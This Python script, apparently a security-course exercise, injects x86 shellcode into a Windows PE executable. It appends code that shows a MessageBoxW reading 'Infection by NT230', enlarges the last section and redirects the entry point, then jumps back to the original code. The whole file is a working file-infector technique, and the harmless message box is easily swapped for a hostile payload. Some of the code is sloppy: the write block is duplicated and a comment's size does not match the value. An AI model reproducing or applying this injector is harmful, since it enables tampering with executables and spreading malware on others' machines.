import sys
import pefile
import shutil
import os

def findMsgBox(pe):
    for entry in pe.DIRECTORY_ENTRY_IMPORT:
        dll_name = entry.dll.decode('utf-8')
        if dll_name == "USER32.dll":
            for func in entry.imports:
                if func.name.decode('utf-8') == "MessageBoxW":
                    return func.address

def inject_payload(exe_path):
    print (f"File {exe_path} is being infected...")
    # Tên file mới sau khi sao chép
    new_file = f"{exe_path[:-4]}-infected.exe"
    
    # Đọc tập tin thực thi
    pe = pefile.PE(exe_path)

    # Copy file sang file mới
    shutil.copyfile(exe_path, new_file)

    # Chuan bi tham so
    # Image Base:
    image_base = pe.OPTIONAL_HEADER.ImageBase

    # Old Entry Point:
    old_entry_point = pe.OPTIONAL_HEADER.AddressOfEntryPoint

    # Lấy section cuối cùng
    last_section = pe.sections[-1]

    # offset = RA - Section_RA = VA - Section VA
    section_VA = last_section.VirtualAddress
    section_RA = last_section.PointerToRawData
    RA_x = os.path.getsize(exe_path) + 0x40
    RA_y = os.path.getsize(exe_path) + 0x80
    RA_new_entry_point =  os.path.getsize(exe_path)
    VA_new_entry_point = RA_new_entry_point - section_RA + section_VA + image_base

    VA_x = RA_x - section_RA + section_VA + image_base
    VA_y = RA_y - section_RA + section_VA + image_base
    jmp_instruction_VA = VA_new_entry_point + 0x14
    relative_VA = (old_entry_point + image_base) -0x5 - jmp_instruction_VA

    #Chuan bi payload
    caption_payload = b'\x49\x00\x6E\x00\x66\x00\x65\x00\x63\x00\x74\x00\x69\x00\x6F\x00\x6E\x00\x20\x00\x62\x00\x79\x00\x20\x00\x4E\x00\x54\x00\x32\x00\x33\x00\x30\x00\x00\x00\x00\x00'
    text_payload = b'\x32\x00\x31\x00\x35\x00\x32\x00\x30\x00\x34\x00\x30\x00\x38\x00\x20\x00\x32\x00\x31\x00\x35\x00\x32\x00\x32\x00\x34\x00\x32\x00\x34\x00\x20\x00\x32\x00\x31\x00\x35\x00\x32\x00\x32\x00\x36\x00\x32\x00\x37\x00\x00\x00\x00\x00'

    #Chuan bi ma asm
    #push 0
    shell_code = b'\x6a\x00'
    #push caption
    shell_code += b'\x68' + VA_x.to_bytes(4, byteorder='little')
    #push text
    shell_code += b'\x68' + VA_y.to_bytes(4, byteorder='little')
    #push 0
    shell_code += b'\x6a\x00'
    #call MessageBoxW
    shell_code += b'\xff\x15' + findMsgBox(pe).to_bytes(4, byteorder='little')
    #jmp to original entry point
    shell_code += b'\xe9' + relative_VA.to_bytes(4, byteorder='little', signed=True)

    #Chen vao chuong trinh
    with open(new_file, 'r+b') as file:
        # Di chuyển đến vị trí chèn
        file.seek(os.path.getsize(new_file))
        # Chèn chuỗi byte
        file.write(shell_code)

        # Di chuyển đến vị trí chèn
        file.seek(RA_x)
        # Chèn chuỗi byte
        file.write(caption_payload)

        # Di chuyển đến vị trí chèn
        file.seek(RA_y)
        # Chèn chuỗi byte
        file.write(text_payload)

    with open(new_file, 'ab') as file:
        file.seek(0, os.SEEK_END)  # Di chuyển con trỏ đến cuối file
        file.write(b'\x00' * 200)  # Thêm 200 byte giá trị 0x00

    with open(new_file, 'r+b') as file:
        # Di chuyển đến vị trí chèn
        file.seek(os.path.getsize(new_file))
        # Chèn chuỗi byte
        file.write(shell_code)

        # Di chuyển đến vị trí chèn
        file.seek(RA_x)
        # Chèn chuỗi byte
        file.write(caption_payload)

        # Di chuyển đến vị trí chèn
        file.seek(RA_y)
        # Chèn chuỗi byte
        file.write(text_payload)

    #Chinh sua gia tri header
    with open(new_file, 'r+b') as file:
        # Thay đổi .rsrc Section Header
        last_section.Misc_VirtualSize += 200
        last_section.SizeOfRawData += 200

        # Tăng SizeOfImage lên 500 trong Optional Headers
        pe.OPTIONAL_HEADER.SizeOfImage += 200

        # Chỉnh sửa AddressOfEntryPoint trong Optional Headers
        pe.OPTIONAL_HEADER.AddressOfEntryPoint = VA_new_entry_point - image_base

        # Lưu lại các thay đổi vào file PE
        # Ghi các thay đổi trở lại file
        file.seek(0)  # Đưa con trỏ về đầu file
        file.write(pe.write())  # Ghi lại dữ liệu PE đã chỉnh sửa
    print("DONE")
    # # In ra thông tin về section cuối cùng
    # print("Name:", last_section.Name.decode().strip('\x00'))
    # print("Virtual Address:", hex(section_VA))
    # print("Raw Size:", hex(section_RA))
    # print("Virtual Size:", hex(last_section.Misc_VirtualSize))
    # print("Characteristics:", hex(last_section.Characteristics))
    # print(VA_new_entry_point)
    print(shell_code)
    # # Hiển thị các thông tin cơ bản về tập tin thực thi
    # print("ImageBase:", hex(image_base))
    # print("EntryPoint:", hex(old_entry_point))
    # print("Number of Sections:", pe.FILE_HEADER.NumberOfSections - 1)
    # print("msg", findMsgBox(pe).to_bytes(4,byteorder='little'))
    # print(f"Injection File: {new_file} completed!")

# Hàm main để thực thi chương trình
def main():
    # Kiểm tra xem đã nhập đúng số lượng tham số chưa
    if len(sys.argv) != 2:
        print("Usage: python script_name.py <exe file>")
        sys.exit(1)

    # Lấy đường dẫn tập tin từ tham số dòng lệnh
    exe_path = sys.argv[1]

    # Kiểm tra xem đường dẫn tập tin có hợp lệ không
    if not os.path.isfile(exe_path):
        print("File not found.")
        sys.exit(1)

    # Gọi hàm inject_payload để thực hiện việc chèn payload vào tập tin thực thi
    inject_payload(exe_path)

# Kiểm tra xem script được chạy trực tiếp hay là được import vào một module khác
if __name__ == "__main__":
    main()

